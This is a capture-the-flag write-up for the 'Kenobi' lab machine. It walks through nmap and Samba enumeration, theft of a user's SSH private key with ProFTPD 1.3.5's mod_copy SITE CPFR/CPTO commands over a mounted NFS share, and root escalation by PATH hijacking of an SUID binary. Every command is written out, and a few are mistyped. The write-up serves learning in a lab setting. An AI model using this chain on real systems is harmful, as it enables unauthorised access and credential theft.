#CTF
This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.

## Recon

As always we start with [[Nmap]] to scan the machine and here are the results:

```
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (EdDSA)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      35329/tcp  mountd
|   100005  1,2,3      37948/udp  mountd
|   100021  1,3,4      34655/tcp  nlockmgr
|   100021  1,3,4      35869/udp  nlockmgr
|   100227  2,3         2049/tcp  nfs_acl
|_  100227  2,3         2049/udp  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
MAC Address: 02:A4:95:01:54:C9 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3.13
OS details: Linux 3.13
Network Distance: 1 hop
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

So lots of information. Did some research online about 111,139,445,2049 because I haven't seen them before and here is what I found out.

- port 111 : tcp,udp - SunRPC 
	Provides information between Unix based systems. Port is often probed, it can be used to fingerprint the Nix OS, and to obtain information about available services. Port used with NFS, NIS, or any rpc-based service.
- port 139 : tcp,udp -netbios-ss 
	NetBIOS is a protocol used for File and Print Sharing under all current versions of Windows. While this in itself is not a problem, the way that the protocol is implemented can be. There are a number of vulnerabilities associated with leaving this port open.
- port 445 : tcp - microsoft-ds
	TCP port 445 is used for direct TCP/IP MS Networking access without the need for a NetBIOS layer. The SMB (Server Message Block) protocol is used for file sharing in Windows NT/2K/XP and later. In Windows NT it ran on top of NetBT (NetBIOS over TCP/IP, ports 137, 139 and 138/udp). In Windows 2K/XP and later, Microsoft added the possibility to run SMB directly over TCP/IP, without the extra NetBT layer, for this they use TCP port 445.
- port 2049 : tcp,udp,sctp NFS
	Network File System (NFS) - remote filesystem access [[RFC 1813](http://tools.ietf.org/html/rfc1813 "RFC 1813")] [[RFC5665](http://tools.ietf.org/html/rfc5665 "RFC5665")]. A commonly scanned and exploited attack vector. Normally, port scanning is needed to find which port this service runs on, but since most installations run NFS on this port, hackers/crackers can bypass fingerprinting and try this port directly.


## Enumerating Samba for shares

We are going to focus on Samba on this machine.

*Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

*Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.*

The room gives us the command to enumarate the shares of the samba share with :
`nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.16.149`
and here are the results:
```
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 02:A4:95:01:54:C9 (Unknown)

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.16.149\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.16.149\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.16.149\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

So we see three shares, one called anonymous which sounds promising.
Lets try to connect with:
`anosmbclient //[ip]/anonymous`
Pressing enter on the password and we are in!
We can't do much on this terminal (can't cat the file) and so we are going to download this share on our local machine with:
`smbclient //[ip]/anonymous`
And now we can cat the log.txt file that we got from the share.


Next we are going to target that 111 port.

*Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. *

We enumerate it like so:
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.16.149`
and we get:
```
PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-showmount: 
|_  /var *
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836524.0  6877104.0  22%   16.0T        32000
MAC Address: 02:A4:95:01:54:C9 (Unknown)
```

## Gain initial access with ProFtpd

*ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.*

We are going to use [[Introductory Networking#Netcat]] to connect to the port 21 with:
`nc [ip] [port /21]`
We get the version and now we search for vulnerabilites for this version with:
`searchploit ProFTPd 1.3.5`
And we find 5 of them.

*You should have found an exploit from ProFtpd's [mod_copy module](http://www.proftpd.org/docs/contrib/mod_copy.html). 
The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.
We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

We are going to use those 2 commands to steal the id_rsa. So inside the opened connection we 
`SITE CPFR /home/kenobi/.ssh/id_rsa` and
`SITE CPTO /var/tmp/id_rsa`  

Now we have to mount the /var folder and we do it like so:
```
mkdir /mnt/kenobiNFS  
mount [ip]:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.
To connect to the machine we :
```
cp /mnt/kenobiNFS/tmp/id_rsa .
sudo chmod 600 id_rsa 
ssh -i id_rsa kenobi@[ip]
```

And we are in and get a flag!
## Privilege Escalation with Path Variable Manipulation

![](https://i.imgur.com/LN2uOCJ.png)

SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

To search the a system for these type of files run the following: 
`find / -perm -u=s -type f 2>/dev/null`

So /usr/bin/menu looks promising. I run it and I got :
```
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Next we :

```
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!
And we get our final flag!
